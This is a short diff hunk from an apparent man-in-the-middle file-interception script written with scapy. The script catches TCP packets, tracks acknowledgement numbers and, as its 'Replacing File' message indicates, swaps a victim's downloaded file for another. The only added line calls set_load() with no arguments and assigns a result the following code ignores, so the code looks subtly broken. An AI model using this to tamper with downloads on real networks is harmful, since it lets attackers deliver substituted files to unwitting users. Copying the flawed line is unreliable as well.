@@ -31,7 +31,7 @@ def process_packet(packet):
 #remove seq field from each captured packet once it has been processed
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing File")
-                
+                modified_packet = set_load()
 
 #set scapy_packet to a string and set payload which will save the packet
                 packet.set_payload(str(scapy_packet))
